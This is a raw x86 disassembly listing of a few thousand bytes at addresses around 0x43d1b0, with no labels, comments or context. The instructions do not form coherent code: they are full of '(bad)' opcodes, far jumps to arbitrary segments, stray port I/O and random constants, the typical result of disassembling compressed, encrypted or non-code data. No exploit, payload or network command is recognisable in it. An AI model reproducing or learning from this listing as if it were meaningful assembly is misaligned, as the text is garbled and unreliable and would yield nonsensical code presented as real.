  43d1b0:	cmc    
  43d1b1:	adc    eax,0x64d0d1b8
  43d1b6:	(bad)  
  43d1b7:	push   cs
  43d1b8:	mov    ecx,edx
  43d1ba:	ins    BYTE PTR es:[edi],dx
  43d1bb:	(bad)  
  43d1bc:	in     al,dx
  43d1bd:	adc    dl,BYTE PTR [eax]
  43d1bf:	or     cl,BYTE PTR [edx]
  43d1c1:	sbb    dl,bl
  43d1c3:	call   0x1432:0xd4d59046
  43d1ca:	mov    al,ds:0xc701ec4c
  43d1cf:	xor    BYTE PTR [esi-0x3df3d055],0x14
  43d1d6:	or     BYTE PTR ds:0x7a2c460d,cl
  43d1dc:	push   ss
  43d1dd:	ds into 
  43d1df:	add    BYTE PTR [ebp-0x51dded2e],ch
  43d1e5:	aam    0xe2
  43d1e7:	and    al,0x36
  43d1e9:	adc    eax,0x7e306474
  43d1ee:	jl     0x43d1ba
  43d1f0:	jae    0x43d20e
  43d1f2:	(bad)
  43d1f8:	cwde   
  43d1f9:	(bad)  
  43d1fa:	cld    
  43d1fb:	lods   eax,DWORD PTR ds:[esi]
  43d1fc:	call   0xf962ca8b
  43d201:	lods   eax,DWORD PTR ds:[esi]
  43d202:	(bad)  
  43d203:	adc    bl,BYTE PTR [ebp+ebp*2-0x48]
  43d207:	push   esi
  43d208:	ss in  al,dx
  43d20a:	mov    ch,0x81
  43d20c:	inc    ecx
  43d20d:	ror    cl,1
  43d20f:	mov    es,WORD PTR [edx-0x33272fc2]
  43d215:	in     al,dx
  43d216:	mov    eax,0x3fe4d562
  43d21b:	je     0x43d236
  43d21d:	sub    ebp,esp
  43d21f:	xchg   ebx,eax
  43d220:	les    esi,FWORD PTR [esi-0x608359c0]
  43d226:	shr    DWORD PTR [eax+0x326fd824],0x75
  43d22d:	mov    bh,0x94
  43d22f:	sbb    al,0xd4
  43d231:	stos   BYTE PTR es:[edi],al
  43d232:	push   0x52c3c614
  43d237:	mov    ebx,0x10f2c76
  43d23c:	fist   DWORD PTR [ebx]
  43d23e:	mov    al,0xae
  43d240:	adc    BYTE PTR [ebx],0x50
  43d243:	inc    esp
  43d244:	adc    al,0xf4
  43d246:	inc    ecx
  43d247:	(bad)  
  43d248:	push   esi
  43d249:	lahf   
  43d24a:	inc    eax
  43d24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d24c:	fisub  DWORD PTR [ebp-0x704a57c]
  43d252:	popf   
  43d253:	cmp    ch,BYTE PTR [edi]
  43d255:	cli    
  43d256:	and    al,0x5a
  43d258:	cmp    eax,0x8690a81a
  43d25d:	in     al,0xde
  43d25f:	mov    ah,0xc
  43d261:	jge    0x43d289
  43d263:	ss inc eax
  43d265:	or     ebx,DWORD PTR [edi]
  43d267:	xchg   BYTE PTR [edx],cl
  43d269:	jge    0x43d219
  43d26b:	jmp    0xc088:0xcf320e16
  43d272:	push   es
  43d273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d274:	add    BYTE PTR [ebx+0x6a59928c],dh
  43d27a:	add    al,0xb6
  43d27c:	mov    dl,dl
  43d27e:	inc    esi
  43d27f:	lea    eax,[esi-0xaf0e7c2]
  43d285:	push   0x9ae2aaab
  43d28a:	adc    cl,BYTE PTR [esi+ecx*4+0x2586a2be]
  43d291:	push   eax
  43d292:	push   eax
  43d293:	and    al,0xae
  43d295:	outs   dx,BYTE PTR ds:[esi]
  43d296:	sub    dl,BYTE PTR [esi+edx*8+0x5]
  43d29a:	push   0x37
  43d29c:	mov    DWORD PTR [eax],esp
  43d29e:	ss icebp 
  43d2a0:	inc    ebx
  43d2a1:	sub    BYTE PTR [esp+esi*2-0x4085918e],al
  43d2a8:	mov    ds:0x927c75b5,al
  43d2ad:	xor    eax,0x9e64c6ea
  43d2b2:	in     al,dx
  43d2b3:	(bad)  
  43d2b5:	push   ebp
  43d2b6:	cmp    al,0x20
  43d2b8:	test   al,0x3f
  43d2ba:	shl    dl,1
  43d2bc:	jp     0x43d263
  43d2be:	stc    
  43d2bf:	and    eax,0x6c102fd9
  43d2c4:	and    cl,BYTE PTR [esi+edx*8]
  43d2c7:	dec    edx
  43d2c8:	test   DWORD PTR [edx],esi
  43d2ca:	rol    DWORD PTR [esi-0x7db2174a],0xa
  43d2d1:	lods   eax,DWORD PTR ds:[esi]
  43d2d2:	inc    edi
  43d2d3:	pop    esp
  43d2d4:	xchg   ebp,eax
  43d2d5:	sahf   
  43d2d6:	adc    ebp,ebp
  43d2d8:	xchg   ebp,eax
  43d2d9:	test   DWORD PTR [edi],edx
  43d2db:	pop    esp
  43d2dc:	dec    ecx
  43d2dd:	cmp    ebp,DWORD PTR [esi-0x73]
  43d2e0:	nop
  43d2e1:	loop   0x43d321
  43d2e3:	ret    0x43c0
  43d2e6:	inc    ecx
  43d2e7:	in     al,dx
  43d2e8:	aad    0xc5
  43d2ea:	push   ebx
  43d2eb:	js     0x43d31f
  43d2ed:	pop    esi
  43d2ee:	and    al,0x8f
  43d2f0:	mov    esi,0x5500b5d8
  43d2f5:	rcl    BYTE PTR [eax],cl
  43d2f7:	push   esp
  43d2f8:	fcomp  DWORD PTR [ebx-0x4a]
  43d2fb:	addr16 push ebx
  43d2fd:	scas   eax,DWORD PTR es:[edi]
  43d2fe:	bound  esp,QWORD PTR [edi-0x53776712]
  43d304:	mov    eax,0xdada1023
  43d309:	and    eax,0xb47c165a
  43d30e:	add    al,0xf6
  43d310:	repz cmp al,0xa6
  43d313:	mov    ch,0x3d
  43d315:	ret    0x76ae
  43d318:	jmp    0x107:0x608c3016
  43d31f:	js     0x43d385
  43d321:	add    al,0xd2
  43d323:	imul   esi,DWORD PTR [eax-0x39f71e56],0xffffff98
  43d32a:	xchg   BYTE PTR fs:[esi+esi*4],cl
  43d32e:	shl    DWORD PTR [ecx+0x2628d681],0xd5
  43d335:	mov    gs,edx
  43d337:	(bad)  
  43d338:	rol    BYTE PTR [ebx],1
  43d33a:	mov    eax,ds:0xce0c5e0
  43d33f:	dec    edi
  43d340:	cmp    ah,ch
  43d342:	sub    DWORD PTR [eax-0x517512fb],ebp
  43d348:	aaa    
  43d349:	fmul   QWORD PTR [esi+ebp*4]
  43d34c:	inc    edx
  43d34d:	in     al,0xc7
  43d34f:	sbb    eax,0xbd443e16
  43d354:	out    0x63,al
  43d356:	add    cl,ah
  43d358:	push   ds
  43d359:	sbb    cl,BYTE PTR [edx]
  43d35b:	cmp    bl,BYTE PTR [edx+0x52]
  43d35e:	pop    esi
  43d35f:	adc    eax,0x2cba205a
  43d364:	sbb    al,BYTE PTR [ebx-0x5b]
  43d367:	dec    edi
  43d368:	sbb    ebx,DWORD PTR [ebx]
  43d36a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d36b:	pop    ds
  43d36c:	push   ebp
  43d36d:	push   edx
  43d36e:	mov    ebp,eax
  43d370:	pop    ebx
  43d371:	push   eax
  43d372:	xchg   ebp,eax
  43d373:	adc    BYTE PTR [edx],0xb8
  43d376:	push   cs
  43d377:	outs   dx,DWORD PTR ds:[esi]
  43d378:	adc    BYTE PTR [eax-0x42],ch
  43d37b:	es or  ch,ch
  43d37e:	add    BYTE PTR [edi-0x25],dl
  43d381:	and    al,0xce
  43d383:	mov    eax,ds:0x30d04745
  43d388:	data16 ror bl,cl
  43d38b:	ds jl  0x43d3ba
  43d38e:	pop    edx
  43d38f:	aad    0xd1
  43d391:	mov    gs,eax
  43d393:	cmp    al,0x46
  43d395:	pusha  
  43d396:	ins    BYTE PTR es:[edi],dx
  43d397:	jp     0x43d31d
  43d399:	add    edx,edi
  43d39b:	loop   0x43d326
  43d39d:	in     eax,dx
  43d39e:	dec    ebx
  43d39f:	and    BYTE PTR [ebx],bh
  43d3a1:	cs inc ecx
  43d3a3:	push   ebp
  43d3a4:	je     0x43d3e3
  43d3a6:	fcomp  st(0)
  43d3a8:	imul   esi,edx,0xc386fd96
  43d3ae:	xchg   esi,eax
  43d3af:	shr    DWORD PTR ds:0xaad73aaa,1
  43d3b5:	jle    0x43d3d2
  43d3b7:	ins    DWORD PTR es:[edi],dx
  43d3b8:	add    eax,0x6abdc238
  43d3bd:	fwait
  43d3be:	push   ss
  43d3bf:	imul   edx,edx,0xffffff87
  43d3c2:	cdq    
  43d3c3:	mov    ah,0x8e
  43d3c5:	les    ebp,FWORD PTR [ebx]
  43d3c7:	add    al,al
  43d3c9:	aam    0x26
  43d3cb:	mul    BYTE PTR [eax-0x677d620a]
  43d3d1:	jne    0x43d3bc
  43d3d3:	add    BYTE PTR [ecx+0x763c16ad],dl
  43d3d9:	and    eax,esp
  43d3db:	xchg   ecx,eax
  43d3dc:	jmp    0x5216:0xbec695a9
  43d3e3:	call   0xdb9897eb
  43d3e8:	and    bh,BYTE PTR [eax+0x40]
  43d3eb:	jnp    0x43d3f1
  43d3ed:	adc    al,0x9a
  43d3ef:	mov    dl,0x19
  43d3f1:	fs out dx,eax
  43d3f3:	and    BYTE PTR [esi+0x6],al
  43d3f6:	lock retf 
  43d3f8:	inc    esi
  43d3f9:	lahf   
  43d3fa:	push   eax
  43d3fb:	xchg   edi,eax
  43d3fc:	fimul  WORD PTR [edx]
  43d3fe:	mov    esi,0x3f267c41
  43d403:	shl    BYTE PTR [edx],1
  43d405:	into   
  43d406:	js     0x43d464
  43d408:	test   BYTE PTR [ebx+eax*1+0xb],0x9c
  43d40d:	repz push edi
  43d40f:	jo     0x43d457
  43d411:	pop    eax
  43d412:	or     DWORD PTR [eax-0x6f],ebx
  43d415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d416:	sub    ah,ch
  43d418:	and    al,0x7c
  43d41a:	push   0x17
  43d41c:	xor    al,0x1a
  43d41e:	(bad)  
  43d41f:	xchg   ebx,eax
  43d420:	push   0x786c40ca
  43d425:	sub    DWORD PTR [ecx-0x4fc9dd3d],ebp
  43d42b:	rcr    DWORD PTR [edi],cl
  43d42d:	add    DWORD PTR [ebp-0x26fbaca3],esi
  43d433:	inc    eax
  43d434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d435:	leave  
  43d436:	inc    esp
  43d437:	add    al,0x20
  43d439:	cmp    ch,BYTE PTR [eax+0x248eb49e]
  43d43f:	imul   edx,DWORD PTR [edx-0x7178ed56],0x11
  43d446:	add    al,0x40
  43d448:	and    eax,0xbc5e310c
  43d44d:	(bad)  
  43d44e:	inc    DWORD PTR [edx]
  43d450:	lock adc DWORD PTR [eax+0x53],ecx
  43d454:	sub    DWORD PTR [eax+edx*2-0xf],ebx
  43d458:	add    ah,bh
  43d45a:	mov    cl,0x8d
  43d45c:	mov    ah,dh
  43d45e:	sub    DWORD PTR [eax],eax
  43d460:	pop    es
  43d461:	mov    dh,0x4c
  43d463:	ret    0x24d2
  43d466:	mov    ah,0x63
  43d468:	jmp    0x3256c109
  43d46d:	push   ss
  43d46e:	xor    ah,dh
  43d470:	(bad)  [ecx]
  43d472:	shl    DWORD PTR [esi-0x29cd27c4],1
  43d478:	lods   al,BYTE PTR ds:[esi]
  43d479:	xchg   ebp,eax
  43d47a:	add    bh,bh
  43d47c:	stos   DWORD PTR es:[edi],eax
  43d47d:	clc    
  43d47e:	popa   
  43d47f:	popa   
  43d480:	mov    bl,0x64
  43d482:	mov    eax,0xf2dab876
  43d487:	xchg   edi,eax
  43d488:	retf   
  43d489:	mov    al,BYTE PTR [esi+0x1d]
  43d48c:	inc    edx
  43d48d:	in     al,0x58
  43d48f:	cmp    al,0xaf
  43d491:	sbb    al,0x9c
  43d493:	add    bh,BYTE PTR [esi]
  43d495:	test   DWORD PTR [ebx+0x3c42fb14],ebx
  43d49b:	or     ch,al
  43d49d:	ficom  DWORD PTR [esi]
  43d49f:	mov    ah,0x75
  43d4a1:	push   cs
  43d4a2:	xor    cl,BYTE PTR [esi]
  43d4a4:	icebp  
  43d4a5:	add    al,0x16
  43d4a7:	adc    eax,0x68ee4435
  43d4ac:	jne    0x43d4ac
  43d4ae:	cmp    al,0x5c
  43d4b0:	mov    ah,0xe2
  43d4b2:	test   BYTE PTR [ebx-0x77da583a],0x48
  43d4b9:	add    BYTE PTR [ebx-0x2ae8c942],ch
  43d4bf:	jl     0x43d4fc
  43d4c1:	xchg   esi,eax
  43d4c2:	pusha  
  43d4c3:	add    al,0x9a
  43d4c5:	cmc    
  43d4c6:	mov    dl,0x0
  43d4c8:	mov    WORD PTR [esi],es
  43d4ca:	dec    ebp
  43d4cb:	push   esp
  43d4cc:	adc    esp,DWORD PTR [edi+ecx*1-0x3c]
  43d4d0:	jae    0x43d510
  43d4d2:	or     bl,dl
  43d4d4:	sub    eax,0x31a36a00
  43d4d9:	jl     0x43d525
  43d4db:	scas   al,BYTE PTR es:[edi]
  43d4dc:	sub    al,0x30
  43d4de:	das    
  43d4df:	(bad)  
  43d4e1:	ds cs lock out 0xa4,eax
  43d4e6:	outs   dx,BYTE PTR ds:[esi]
  43d4e7:	stos   BYTE PTR es:[edi],al
  43d4e8:	add    BYTE PTR [esp+esi*2],dl
  43d4eb:	fcom   QWORD PTR [edx-0x73076f8b]
  43d4f1:	call   0x132e5ce
  43d4f6:	aam    0xb2
  43d4f8:	(bad)  
  43d4f9:	out    0x6a,al
  43d4fb:	add    BYTE PTR [edx-0x2d64171a],dl
  43d501:	pop    es
  43d502:	add    BYTE PTR [ebx+0x9],bh
  43d505:	xchg   BYTE PTR [eax+0x8495028],dl
  43d50b:	shl    BYTE PTR [edx+edi*4+0x301b53e1],cl
  43d512:	add    ebx,DWORD PTR [esi-0x7eba7dde]
  43d518:	mov    eax,DWORD PTR [esi-0x7a]
  43d51b:	mov    al,0x24
  43d51d:	dec    esp
  43d51e:	out    dx,al
  43d51f:	mov    ds:0x2761652c,al
  43d524:	pop    ebp
  43d525:	leave  
  43d526:	add    BYTE PTR [edx],cl
  43d528:	or     al,BYTE PTR [eax+eax*4]
  43d52b:	mov    ch,BYTE PTR [eax+0x3c]
  43d52e:	and    esp,DWORD PTR [eax-0x63aa29ef]
  43d534:	test   DWORD PTR [eax],eax
  43d536:	adc    BYTE PTR [edx+0x78c35e9b],dl
  43d53c:	sub    BYTE PTR [eax],dh
  43d53e:	push   0xffffffab
  43d540:	push   ss
  43d541:	pop    ss
  43d542:	jmp    0x43d54f
  43d544:	or     al,0x9b
  43d546:	or     ecx,DWORD PTR [esi+0x6f]
  43d549:	add    BYTE PTR [edi],dl
  43d54b:	push   es
  43d54c:	jbe    0x43d586
  43d54e:	sub    dl,BYTE PTR [ebx-0x64]
  43d551:	add    eax,0x2c585c74
  43d556:	cmp    al,0xa2
  43d558:	jns    0x43d5b1
  43d55a:	add    BYTE PTR [eax-0x1051b936],dh
  43d560:	jne    0x43d5ba
  43d562:	push   ebp
  43d563:	pop    edx
  43d564:	aam    0x83
  43d566:	test   DWORD PTR [eax+0x61a64dd6],edi
  43d56c:	push   ebp
  43d56d:	and    DWORD PTR [eax+0x20],0xffffffaf
  43d571:	xchg   esi,eax
  43d572:	(bad)  
  43d573:	data16 je 0x43d547
  43d576:	mov    al,ds:0x480602da
  43d57b:	xor    al,0x8c
  43d57d:	jle    0x43d587
  43d57f:	aas    
  43d580:	dec    esp
  43d581:	into   
  43d582:	add    DWORD PTR [ebx],ebx
  43d584:	adc    BYTE PTR [ecx],al
  43d586:	push   esp
  43d587:	adc    eax,0x3e220f0d
  43d58c:	je     0x43d5c0
  43d58e:	xchg   esi,eax
  43d58f:	out    dx,al
  43d590:	arpl   WORD PTR [ebx+0x56a0a3c4],bx
  43d596:	push   edx
  43d597:	js     0x43d571
  43d599:	scas   al,BYTE PTR es:[edi]
  43d59a:	imul   esp,DWORD PTR [eax-0x1f4b7ebc],0x34da8422
  43d5a4:	push   esp
  43d5a5:	cmp    al,0x42
  43d5a7:	mov    al,0xa6
  43d5a9:	lods   al,BYTE PTR ds:[esi]
  43d5aa:	hlt    
  43d5ab:	push   esi
  43d5ac:	jnp    0x43d62b
  43d5ae:	and    cl,BYTE PTR [edx]
  43d5b0:	push   esi
  43d5b1:	sub    dh,ah
  43d5b3:	enter  0x7ed2,0x88
  43d5b7:	scas   eax,DWORD PTR es:[edi]
  43d5b8:	cmp    al,0x9b
  43d5ba:	push   0xd976b868
  43d5bf:	add    BYTE PTR [ebp-0x5c],al
  43d5c2:	or     BYTE PTR [eax],0xf7
  43d5c5:	test   BYTE PTR [esi-0x6d0daabc],ch
  43d5cb:	ds ja  0x43d5dd
  43d5ce:	add    DWORD PTR [ebx],ecx
  43d5d0:	xchg   esp,eax
  43d5d1:	mov    WORD PTR [esi-0x36],cs
  43d5d4:	sti    
  43d5d5:	es gs ins DWORD PTR es:[edi],dx
  43d5d8:	jle    0x43d59b
  43d5da:	outs   dx,DWORD PTR ds:[esi]
  43d5db:	(bad)  
  43d5dc:	xor    BYTE PTR [edi],dl
  43d5de:	add    dl,bl
  43d5e0:	clc    
  43d5e1:	add    BYTE PTR [ebx+0x1c],dl
  43d5e4:	popf   
  43d5e5:	jge    0x43d640
  43d5e7:	sbb    ebp,DWORD PTR [esi]
  43d5e9:	and    al,0x85
  43d5eb:	xor    cl,BYTE PTR [edi-0x72]
  43d5ee:	sub    bh,BYTE PTR [edx]
  43d5f0:	push   ecx
  43d5f1:	ins    DWORD PTR es:[edi],dx
  43d5f2:	inc    ebx
  43d5f3:	and    al,0x86
  43d5f5:	retf   0xc42
  43d5f8:	sub    esp,edi
  43d5fa:	mov    al,0x48
  43d5fc:	das    
  43d5fd:	cli    
  43d5fe:	mov    dl,0x12
  43d600:	mov    al,0x75
  43d602:	cmp    al,0xfe
  43d604:	fidivr WORD PTR [edx+0xa383426]
  43d60a:	gs call 0x3236b598
  43d610:	jno    0x43d688
  43d612:	mov    al,0x47
  43d614:	ret    0x16d6
  43d617:	sbb    esp,DWORD PTR [esi+eiz*1-0xa]
  43d61b:	shl    bl,cl
  43d61d:	test   BYTE PTR [esi+0x68817401],bh
  43d623:	inc    esp
  43d624:	dec    edx
  43d625:	add    BYTE PTR [esi+0x78],cl
  43d628:	sub    al,0xeb
  43d62a:	mov    eax,ds:0x5e6984a4
  43d62f:	push   es
  43d630:	mov    esp,0x1127d65f
  43d635:	(bad)  
  43d636:	push   esp
  43d637:	ins    DWORD PTR es:[edi],dx
  43d638:	dec    eax
  43d639:	sar    dl,1
  43d63b:	dec    esp
  43d63c:	lods   al,BYTE PTR ds:[esi]
  43d63d:	mov    al,0xb
  43d63f:	loop   0x43d5f3
  43d641:	addr16 push edi
  43d643:	ds inc edi
  43d645:	push   esi
  43d646:	mov    BYTE PTR [eax],ah
  43d648:	cmp    eax,0xc268881
  43d64d:	cmp    cl,BYTE PTR [ecx]
  43d64f:	push   ebp
  43d650:	jne    0x43d624
  43d652:	inc    edx
  43d653:	or     al,0x77
  43d655:	xchg   esp,eax
  43d656:	ja     0x43d603
  43d658:	mov    DWORD PTR [eax+edi*4],ecx
  43d65b:	clc    
  43d65c:	into   
  43d65d:	pop    eax
  43d65e:	sbb    ecx,esp
  43d660:	test   DWORD PTR [ecx+0x2e8e026a],eax
  43d666:	cmp    DWORD PTR [edi],edx
  43d668:	hlt    
  43d669:	pop    eax
  43d66a:	(bad)  
  43d66b:	or     edx,DWORD PTR [eax+0x23]
  43d66e:	enter  0x6826,0x7f
  43d672:	int    0x40
  43d674:	cmp    edx,DWORD PTR [eax]
  43d676:	jbe    0x43d62e
  43d678:	fs pop es
  43d67a:	shl    cl,1
  43d67c:	and    BYTE PTR [edx-0x3fb1eef1],0x98
  43d683:	push   edx
  43d684:	ins    BYTE PTR es:[edi],dx
  43d685:	pop    ebx
  43d686:	push   esp
  43d687:	inc    ebx
  43d688:	lds    esp,FWORD PTR [edx-0xd310bf9]
  43d68e:	push   ss
  43d68f:	clc    
  43d690:	test   BYTE PTR ds:0xd21cc2f6,al
  43d696:	jo     0x43d6da
  43d698:	cmp    ch,BYTE PTR [esi-0x2f4fd02c]
  43d69e:	(bad)  
  43d69f:	push   eax
  43d6a0:	gs aam 0xc6
  43d6a3:	mov    ds,WORD PTR [esi-0x299e290c]
  43d6a9:	mov    ds:0x4e5f1535,eax
  43d6ae:	xchg   edx,eax
  43d6af:	cli    
  43d6b0:	je     0x43d730
  43d6b2:	push   edx
  43d6b3:	mov    cl,0xb5
  43d6b5:	push   ebx
  43d6b6:	imul   ebp,DWORD PTR [edx+0x66],0x22
  43d6ba:	or     cl,BYTE PTR [esi-0x589a7cd]
  43d6c0:	(bad)  
  43d6c1:	xchg   ebx,eax
  43d6c2:	shr    DWORD PTR [edx+ebp*8-0x5f],1
  43d6c6:	ins    BYTE PTR es:[edi],dx
  43d6c7:	clc    
  43d6c8:	sub    ah,BYTE PTR ds:0x44005c00
  43d6ce:	in     al,dx
  43d6cf:	jl     0x43d6d7
  43d6d1:	sti    
  43d6d2:	sub    cl,ch
  43d6d4:	hlt    
  43d6d5:	or     al,0x71
  43d6d7:	xor    DWORD PTR [esi+0x6e],0xb62840cd
  43d6de:	out    dx,eax
  43d6df:	xor    al,0x14
  43d6e1:	pcmpgtb mm7,QWORD PTR [edx-0x6]
  43d6e5:	push   eax
  43d6e6:	or     BYTE PTR ds:0xeba4b22,0x60
  43d6ed:	bound  ebp,QWORD PTR [eax+eax*8+0x3a]
  43d6f1:	fsubr  QWORD PTR [edx-0x54]
  43d6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d6f5:	add    dl,dl
  43d6f7:	jmp    0x43d6d5
  43d6f9:	stos   DWORD PTR es:[edi],eax
  43d6fa:	xor    al,0x1
  43d6fc:	sub    DWORD PTR [esi+edx*2-0x5f77185a],0xffffffd3
  43d704:	push   0x1fe3855d
  43d709:	cs pop eax
  43d70b:	(bad)  
  43d70c:	sub    BYTE PTR [edx],al
  43d70e:	pop    edx
  43d70f:	lock or DWORD PTR [esi-0x19],eax
  43d713:	jmp    0xf002:0x17ad2b88
  43d71a:	pop    esp
  43d71b:	add    ah,0xee
  43d71e:	ja     0x43d713
  43d720:	add    BYTE PTR [edi-0x75edd128],0xb2
  43d727:	sub    ecx,ebp
  43d729:	and    BYTE PTR [edi+0x3db9a088],0x26
  43d730:	in     al,dx
  43d731:	fiadd  DWORD PTR [edx-0x18]
  43d734:	fadd   DWORD PTR [eax]
  43d736:	sbb    BYTE PTR [eax],cl
  43d738:	inc    edi
  43d739:	xor    dl,al
  43d73b:	mov    al,0xe4
  43d73d:	ret    
  43d73e:	daa    
  43d73f:	je     0x43d7b1
  43d741:	clc    
  43d742:	pop    es
  43d743:	sahf   
  43d744:	sub    DWORD PTR [eax+0x6b],esp
  43d747:	out    dx,al
  43d748:	push   eax
  43d749:	push   ss
  43d74a:	push   0xffffffc0
  43d74c:	jle    0x43d6d1
  43d74e:	add    al,0x5b
  43d750:	and    eax,0xf6c68684
  43d755:	mov    edi,0x544f882e
  43d75a:	and    eax,0x20683e8
  43d75f:	push   eax
  43d760:	cli    
  43d761:	dec    ebp
  43d762:	add    ebx,DWORD PTR [edi]
  43d764:	stos   BYTE PTR es:[edi],al
  43d765:	ret    0x62d1
  43d768:	addr16 pop ecx
  43d76a:	lods   al,BYTE PTR ds:[esi]
  43d76b:	lods   eax,DWORD PTR ds:[esi]
  43d76c:	jge    0x43d707
  43d76e:	loopne 0x43d781
  43d770:	push   edx
  43d771:	fisub  DWORD PTR [esi+0x5ad0346e]
  43d777:	sti    
  43d778:	adc    DWORD PTR [edx+0x78],edx
  43d77b:	pop    esi
  43d77c:	add    BYTE PTR [eax-0x36e92418],ah
  43d782:	cli    
  43d783:	inc    eax
  43d784:	add    al,0x21
  43d786:	push   ss
  43d787:	push   esp
  43d788:	push   esp
  43d789:	stos   BYTE PTR es:[edi],al
  43d78a:	cli    
  43d78b:	inc    edx
  43d78c:	pop    ebx
  43d78d:	aad    0xe1
  43d78f:	mov    al,0x8a
  43d791:	push   edi
  43d792:	add    BYTE PTR [esi],bh
  43d794:	dec    eax
  43d795:	call   0x21115be1
  43d79a:	sahf   
  43d79b:	and    BYTE PTR [eax+esi*4+0x1c2b03d5],bl
  43d7a2:	das    
  43d7a3:	loopne 0x43d77b
  43d7a5:	int3   
  43d7a6:	ss call 0x2cf8:0x815eb6f1
  43d7ae:	stos   BYTE PTR es:[edi],al
  43d7af:	loopne 0x43d7f0
  43d7b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d7b2:	dec    edi
  43d7b3:	mov    ecx,0x20ae065
  43d7b8:	and    al,0x3a
  43d7ba:	inc    eax
  43d7bb:	cmp    BYTE PTR [eax],dh
  43d7bd:	push   eax
  43d7be:	fsub   DWORD PTR [ebx-0x5e3f3282]
  43d7c4:	imul   esp,DWORD PTR [edx-0x7e53b55a],0xffffffcc
  43d7cb:	add    eax,0x6a48caad
  43d7d0:	pop    edx
  43d7d1:	or     al,0xa6
  43d7d3:	push   eax
  43d7d4:	retfw  0xe061
  43d7d8:	add    eax,0xd84eafac
  43d7dd:	jae    0x43d765
  43d7df:	imul   eax,DWORD PTR [ebx],0x1f
  43d7e2:	push   ss
  43d7e3:	inc    esi
  43d7e4:	xchg   BYTE PTR [edx+edi*1+0x2ab49fbc],dl
  43d7eb:	xor    BYTE PTR [ebx],0xea
  43d7ee:	in     al,dx
  43d7ef:	retf   0x9e51
  43d7f2:	mov    WORD PTR [edx+0x15104ba6],fs
  43d7f8:	push   eax
  43d7f9:	fimul  WORD PTR [esi+0x21]
  43d7fd:	jge    0x43d807
  43d7ff:	ficom  DWORD PTR [ebp+eiz*1-0x24878fb6]
  43d806:	test   DWORD PTR [ebp+0x40882a99],esi
  43d80c:	sbb    eax,edx
  43d80e:	popa   
  43d80f:	pop    eax
  43d810:	popa   
  43d811:	mov    cl,BYTE PTR [edi-0x73a5824b]
  43d817:	cld    
  43d818:	call   0x616c:0x7760e7da
  43d81f:	adc    BYTE PTR [edx+eax*1+0x7e],bh
  43d823:	lea    eax,[eax]
  43d825:	cmp    dl,al
  43d827:	mov    dh,BYTE PTR [eax-0x4c]
  43d82a:	nop
  43d82b:	cld    
  43d82c:	shl    BYTE PTR [edx],0xcc
  43d82f:	cmp    al,0x92
  43d831:	jmp    0xed9d:0x3a92d8a6
  43d838:	test   DWORD PTR [ebp+0x69],edx
  43d83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d83c:	inc    esi
  43d83d:	and    BYTE PTR [ecx],ch
  43d83f:	pop    edx
  43d840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d841:	lea    esp,[edi-0x29f69c80]
  43d847:	ins    DWORD PTR es:[edi],dx
  43d848:	js     0x43d84c
  43d84a:	add    DWORD PTR [ecx],ecx
  43d84c:	inc    edi
  43d84d:	dec    edi
  43d84e:	scas   al,BYTE PTR es:[edi]
  43d84f:	outs   dx,BYTE PTR ds:[esi]
  43d850:	dec    esi
  43d851:	pusha  
  43d852:	cmp    al,0x9b
  43d854:	rcl    BYTE PTR [eax],0x9
  43d857:	call   0x127c50d9
  43d85c:	shl    BYTE PTR [eax-0x6a],1
  43d85f:	mov    dl,0x9e
  43d861:	sub    al,0xf3
  43d863:	cmp    DWORD PTR [esp+edi*2],ebp
  43d866:	dec    edx
  43d867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d868:	and    esi,DWORD PTR [edx]
  43d86a:	pusha  
  43d86b:	sti    
  43d86c:	and    dh,BYTE PTR [esi+ebp*8+0x21fe49f1]
  43d873:	call   0xa54d4129
  43d878:	mul    BYTE PTR [ecx-0x4c]
  43d87b:	jbe    0x43d881
  43d87d:	push   ss
  43d87e:	xchg   esp,eax
  43d87f:	xor    eax,0x44752dc3
  43d884:	ins    BYTE PTR es:[edi],dx
  43d885:	cld    
  43d886:	rol    dl,0x40
  43d889:	cmp    edi,esi
  43d88b:	add    al,0xfe
  43d88d:	lahf   
  43d88e:	mov    ch,0x0
  43d890:	repnz xchg esi,eax
  43d892:	dec    edx
  43d893:	pop    esi
  43d894:	and    edx,DWORD PTR [esi]
  43d896:	ror    BYTE PTR [ebx+0x64],1
  43d899:	inc    sp
  43d89b:	jp     0x43d8a1
  43d89d:	mov    edx,edi
  43d89f:	popa   
  43d8a0:	arpl   WORD PTR [eax+0x1d],bx
  43d8a3:	js     0x43d84f
  43d8a5:	jae    0x43d892
  43d8a7:	cmp    ah,BYTE PTR [eax]
  43d8a9:	hlt    
  43d8aa:	dec    eax
  43d8ab:	jns    0x43d926
  43d8ad:	jle    0x43d86f
  43d8af:	push   0xfa9240ed
  43d8b4:	sub    DWORD PTR [edx-0x20],esp
  43d8b7:	sbb    ah,BYTE PTR [edx]
  43d8b9:	cmp    bl,BYTE PTR [esi]
  43d8bb:	xor    eax,0xfc5c75b1
  43d8c0:	cmp    BYTE PTR [eax+esi*1],0xfa
  43d8c4:	inc    edx
  43d8c5:	lods   al,BYTE PTR ds:[esi]
  43d8c6:	xor    al,0x67
  43d8c8:	or     BYTE PTR [ebp-0x2e],al
  43d8cb:	in     eax,0x4a
  43d8cd:	adc    eax,0x78c8f6a
  43d8d2:	(bad)  
  43d8d3:	fsubr  DWORD PTR [ecx+0x68]
  43d8d6:	stos   BYTE PTR es:[edi],al
  43d8d7:	(bad)  
  43d8d8:	push   ss
  43d8d9:	mov    cl,0x2c
  43d8db:	nop
  43d8dc:	ret    0x4067
  43d8df:	pop    esi
  43d8e0:	xor    DWORD PTR [edx+0x70],ecx
  43d8e3:	js     0x43d865
  43d8e5:	lock inc eax
  43d8e7:	push   0x8
  43d8e9:	and    dl,dl
  43d8eb:	in     al,dx
  43d8ec:	push   edx
  43d8ed:	fisub  DWORD PTR [edx+esi*1-0x78]
  43d8f1:	add    al,0x65
  43d8f3:	xchg   BYTE PTR [eax-0x75816d71],ah
